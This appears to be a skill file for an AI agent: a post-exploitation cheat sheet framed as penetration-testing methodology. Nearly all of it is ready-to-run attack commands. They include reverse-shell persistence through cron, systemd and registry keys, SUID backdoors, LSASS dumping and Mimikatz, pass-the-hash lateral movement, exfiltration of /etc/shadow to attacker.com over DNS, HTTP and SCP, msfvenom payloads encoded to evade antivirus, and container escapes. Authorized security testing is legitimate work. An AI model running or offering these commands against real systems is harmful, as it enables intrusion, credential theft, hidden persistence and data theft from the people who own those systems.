---
name: exploitation
description: Post-exploitation methodology covering shell stabilization, lateral movement, persistence, credential harvesting, and container escape
---

# Exploitation & Post-Exploitation

Getting a shell is the beginning, not the end. This skill covers what to do after initial access: stabilize, enumerate, escalate, persist, and pivot. See also: `privilege_escalation` skill for full privesc coverage.

---

## Shell Stabilization

Raw reverse shells are fragile. Stabilize immediately:

    # Python PTY (most reliable)
    python3 -c "import pty; pty.spawn('/bin/bash')"
    # Then: Ctrl+Z → stty raw -echo; fg → export TERM=xterm

    # Script method
    script /dev/null -c bash

    # Socat full TTY (if socat available on target)
    # Attacker: socat file:`tty`,raw,echo=0 tcp-listen:4444
    # Target: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker>:4444

### Shell Upgrade One-Liner

    python3 -c "import pty;pty.spawn('/bin/bash')" && export TERM=xterm

### Fixing Terminal Size

    # On attacker: stty size → get rows cols (e.g., 50 220)
    # On target shell:
    stty rows 50 cols 220

---

## Persistence

### Linux Persistence

    # SSH authorized_keys
    mkdir -p ~/.ssh && echo "<attacker_pubkey>" >> ~/.ssh/authorized_keys
    chmod 600 ~/.ssh/authorized_keys

    # Cron job (every minute callback)
    (crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/<attacker>/<port> 0>&1") | crontab -

    # Systemd service (if root)
    cat > /etc/systemd/system/backdoor.service << EOF
    [Unit]
    Description=System Health Monitor
    [Service]
    ExecStart=/bin/bash -c "bash -i >& /dev/tcp/<attacker>/<port> 0>&1"
    Restart=always
    RestartSec=30
    [Install]
    WantedBy=multi-user.target
    EOF
    systemctl enable backdoor && systemctl start backdoor

    # SUID shell backdoor (root required)
    cp /bin/bash /tmp/.hidden_bash
    chmod +s /tmp/.hidden_bash
    # Execute: /tmp/.hidden_bash -p

    # LD_PRELOAD backdoor (root required)
    # Write shared library that adds backdoor user to /etc/passwd on any process start

### Windows Persistence

    # Registry Run key
    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater \
      /t REG_SZ /d "C:\Temp\shell.exe" /f

    # Scheduled task
    schtasks /create /tn "SystemUpdate" /tr "C:\Temp\shell.exe" \
      /sc onlogon /ru System /f

    # WMI subscription (stealthy, survives reboots)
    # Create event filter + consumer + binding via PowerShell

    # BITS job
    bitsadmin /create /download updater
    bitsadmin /addfile updater http://<attacker>/shell.exe C:\Temp\shell.exe
    bitsadmin /setnotifycmdline updater C:\Temp\shell.exe NUL
    bitsadmin /setminretrydelay updater 60
    bitsadmin /resume updater

---

## Credential Harvesting

### Linux

    # /etc/shadow (if readable — need root or shadow group)
    cat /etc/shadow

    # Bash/shell history
    cat ~/.bash_history
    cat ~/.zsh_history
    find / -name ".*_history" 2>/dev/null

    # SSH private keys
    find / -name "id_rsa" -o -name "id_ecdsa" -o -name "*.pem" 2>/dev/null | xargs ls -la 2>/dev/null

    # Config files with credentials
    find / -name "*.conf" -o -name "*.config" -o -name ".env" 2>/dev/null | \
      xargs grep -lE "password|passwd|secret|key|token" 2>/dev/null

    # Database configs
    find / -name "wp-config.php" -o -name "database.yml" -o -name "settings.py" \
          -o -name "application.properties" 2>/dev/null

    # In-memory credentials (root required)
    strings /dev/mem 2>/dev/null | grep -iE "pass|password"

### Windows Credential Extraction

    # SAM/SYSTEM (local hashes)
    reg save HKLM\SAM C:\Temp\sam.hive && reg save HKLM\SYSTEM C:\Temp\system.hive
    # Transfer to attacker: impacket-secretsdump LOCAL -sam sam.hive -system system.hive

    # LSASS dump (requires admin)
    # Method 1: Task Manager → Details → lsass.exe → Create dump file
    # Method 2: procdump
    procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
    # Method 3: comsvcs.dll (no extra tool)
    rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass_pid> C:\Temp\lsass.dmp full

    # Parse LSASS dump locally with Mimikatz
    .\mimikatz.exe "sekurlsa::minidump C:\Temp\lsass.dmp" "sekurlsa::logonpasswords" "exit"

    # Credential Manager
    cmdkey /list
    vaultcmd /listcreds:"Windows Credentials" /all

    # Browser credentials (SQLite DBs)
    copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" C:\Temp\chrome_creds.db

---

## Lateral Movement

### Linux/Unix Pivot

    # SSH agent hijacking (if SSH_AUTH_SOCK in env)
    SSH_AUTH_SOCK=/tmp/ssh-xxx/agent.xxx ssh user@nexthost

    # SSH via compromised host (proxyjump)
    ssh -J compromised_host target_host

    # Port forwarding
    # Local forward: access target's port 8080 via attacker's localhost:8080
    ssh -L 8080:internal_host:80 user@pivot

    # SOCKS5 proxy via SSH
    ssh -D 9050 user@pivot
    proxychains nmap -sT internal_network/24

    # Chisel reverse proxy
    # Attacker: chisel server -p 9999 --reverse
    # Target: chisel client <attacker>:9999 R:socks

### Windows Lateral Movement

    # PsExec
    impacket-psexec <domain>/<user>:<pass>@<target>
    # Or: .\PsExec.exe \\<target> -u <user> -p <pass> cmd

    # WMI (stealthier than PsExec)
    impacket-wmiexec <domain>/<user>:<pass>@<target>
    wmic /node:<target> /user:<user> /password:<pass> process call create "cmd.exe /c <command>"

    # WinRM (if open on port 5985/5986)
    impacket-wmiexec <domain>/<user>:<pass>@<target> -codec utf-8
    evil-winrm -i <target> -u <user> -p <pass>

    # Pass-the-Hash
    impacket-psexec <domain>/<user>@<target> -hashes :<ntlm_hash>
    netexec smb <target> -u <user> -H <ntlm_hash> -x "whoami"

---

## Data Exfiltration

    # via DNS (stealthy, bypasses egress filtering)
    # Encode data in DNS labels
    data=$(cat /etc/passwd | base64 | tr -d '\n')
    for chunk in $(echo $data | fold -w 60); do
        nslookup $chunk.attacker.com &>/dev/null
    done

    # via HTTP POST (fast, noisy)
    curl -X POST https://attacker.com/upload \
      -F "file=@/etc/shadow" \
      -F "host=$(hostname)"

    # via SCP (if SSH outbound allowed)
    scp /etc/shadow attacker@attacker.com:/tmp/

    # Windows: certutil base64 encode + HTTP
    certutil -encodehex -f C:\Users\user\secret.txt C:\Temp\encoded.txt 4
    curl -X POST https://attacker.com -d @C:\Temp\encoded.txt

---

## Payload Generation

    # Linux ELF reverse shell
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f elf > shell.elf
    chmod +x shell.elf

    # Windows reverse shell (stageless — no internet needed from target)
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe > shell.exe

    # Web shells
    msfvenom -p php/reverse_php LHOST=<ip> LPORT=443 -f raw > shell.php
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=443 -f raw > shell.jsp

    # Obfuscated via XOR encode (evade basic AV)
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe \
      -e x64/xor_dynamic -i 5 > shell_enc.exe

    # Listener (simple)
    nc -lvnp 443

    # Metasploit multi/handler (for staged payloads)
    msfconsole -q -x "use exploit/multi/handler; \
      set PAYLOAD linux/x64/shell_reverse_tcp; \
      set LHOST <ip>; set LPORT 443; run"

---

## Container Escape (Quick Reference)

Full coverage in `privilege_escalation` skill. Key checks:

    cat /proc/1/cgroup | grep -i docker
    ls /.dockerenv && echo "in Docker"
    cat /proc/self/status | grep CapEff  # high value = privileged

    # Privileged container — mount host
    mount /dev/sda1 /mnt && chroot /mnt bash

    # Docker socket
    ls -la /var/run/docker.sock && \
      docker -H unix:///var/run/docker.sock run -it --rm -v /:/mnt alpine chroot /mnt sh

---

## Evidence Collection (Before Cleanup)

    # System information
    hostname; id; uname -a; ip a; netstat -tulpn > output/sysinfo.txt

    # Users and auth
    cat /etc/passwd /etc/shadow /etc/sudoers >> output/sysinfo.txt 2>/dev/null

    # Network
    arp -a; cat /etc/hosts; route -n >> output/network.txt

    # Processes and services
    ps auxf; systemctl list-units --type=service >> output/services.txt

    # Interesting files found
    find / -name "*.key" -o -name "*.pem" -o -name ".env" 2>/dev/null > output/interesting_files.txt

---

## Pro Tips

1. Stabilize shell before anything else — losing a session mid-exploit is unacceptable
2. Persistence first, then enumerate — if connection drops, you can get back
3. Save every credential found immediately to output/credentials.txt — they'll be needed for lateral movement
4. Use OAST callbacks (curl/DNS) for blind execution confirmation before interactive shell
5. `env` and `.env` files are the #1 source of high-value credentials — check before anything else
6. Port forwarding to internal services is more valuable than a root shell that can't reach anything
7. Document every step — screenshot `id`, `hostname`, `ip a` — needed for report and chain of custody

## Summary

Post-exploitation is a race: stabilize → persist → harvest credentials → move laterally → escalate. Each phase feeds the next. Evidence collection at every host builds the attack chain needed for a complete pentest report.
